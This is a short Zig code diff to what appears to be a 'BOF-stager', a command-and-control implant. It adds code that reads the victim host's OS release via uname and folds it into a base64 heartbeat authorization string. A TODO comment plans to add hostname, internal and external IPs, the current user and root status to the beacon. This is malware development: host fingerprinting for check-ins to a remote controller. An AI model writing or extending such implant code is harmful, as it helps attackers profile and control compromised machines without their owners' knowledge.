@@ -94,12 +94,17 @@ const State = struct {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
+        const native_os = @import("builtin").os.tag;
         const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
         const arch_name = target.cpu.model.name;
-        const os_name = @tagName(target.os.tag);
+        var os_release = @tagName(target.os.tag);
+        if(native_os != .windows) {
+            const utsn: std.posix.utsname = std.posix.uname();
+            os_release = &utsn.release;
+        }
 
         // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
-        const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
+        const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_release });
         defer allocator.free(authz);
 
         const heartbeat_authz = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
@@ -468,6 +473,8 @@ pub fn main() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
+
+    std.log.info("BOF-stager launched", .{});
 
     var state = try State.init(allocator);
     defer state.deinit(allocator);
